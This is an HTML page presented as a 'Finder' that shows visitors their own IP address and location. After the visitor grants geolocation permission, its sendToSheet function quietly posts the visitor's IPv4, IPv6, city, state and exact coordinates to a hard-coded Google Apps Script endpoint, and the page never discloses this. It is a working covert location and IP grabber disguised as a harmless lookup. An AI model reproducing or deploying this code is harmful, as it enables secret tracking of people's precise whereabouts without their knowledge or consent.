<!DOCTYPE html>
<html>
<head>
  <title>Finder</title>
  <style>
    body {
      margin: 0;
      background: white;
      color: black;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      cursor: pointer;
      transition: 0.5s;
    }
  </style>
</head>
<body onclick="start()">

  <div id="content">
    <h1>Click to find location/IP</h1>
  </div>

<script>
function start() {
  document.body.onclick = null;
  document.getElementById("content").innerHTML = "<h1>Requesting permission...</h1>";

  getIP();
  getLocation();
}

let ipv4 = "Loading...";
let ipv6 = "Loading...";

function getIP() {
  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      ipv4 = data.ip;
      updateIP();
    })
    .catch(() => { ipv4 = "Unavailable"; });

  fetch("https://api64.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      ipv6 = data.ip;
      updateIP();
    })
    .catch(() => { ipv6 = "Unavailable"; });
}

function updateIP(){
  if(document.getElementById("ipv4"))
    document.getElementById("ipv4").textContent = ipv4;
  if(document.getElementById("ipv6"))
    document.getElementById("ipv6").textContent = ipv6;
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async pos => {
      let lat = pos.coords.latitude;
      let lon = pos.coords.longitude;

      try {
        let res = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
        );
        let data = await res.json();

        let city =
          data.address.city ||
          data.address.town ||
          data.address.village ||
          "Unknown city";

        let state = data.address.state || "Unknown state";

        showResult(city, state, lat, lon);
        sendToSheet(city, state, lat, lon);

      } catch {
        showResult("Unknown","Unknown",lat,lon);
      }

    }, () => showResult("Permission denied","","",""));
  } else {
    showResult("Not supported","","","");
  }
}

function showResult(city, state, lat, lon) {
  document.body.style.background = "black";
  document.body.style.color = "red";
  document.body.style.cursor = "default";

  document.getElementById("content").innerHTML = `
    <h1>Your Info</h1>
    <p><strong>IPv4:</strong> <span id="ipv4">${ipv4}</span></p>
    <p><strong>IPv6:</strong> <span id="ipv6">${ipv6}</span></p>
    <p><strong>Location:</strong> ${city}${state ? ", " + state : ""}</p>
    <p><strong>Latitude:</strong> ${lat || "Unavailable"}</p>
    <p><strong>Longitude:</strong> ${lon || "Unavailable"}</p>
  `;
}

function sendToSheet(city, state, lat, lon){
  fetch("https://script.google.com/macros/s/AKfycbzmo5qD9YWpKJhR1_X-uKy1IlqpD_k8tMTaq6KHIILL8zZP9TwDadyNJyWqC8WbwClG/exec", {
    method: "POST",
    body: JSON.stringify({
      ipv4: ipv4,
      ipv6: ipv6,
      city: city,
      state: state,
      lat: lat,
      lon: lon
    }),
    headers: { "Content-Type": "application/json" }
  })
  .catch(console.error);
}
</script>

</body>
</html>
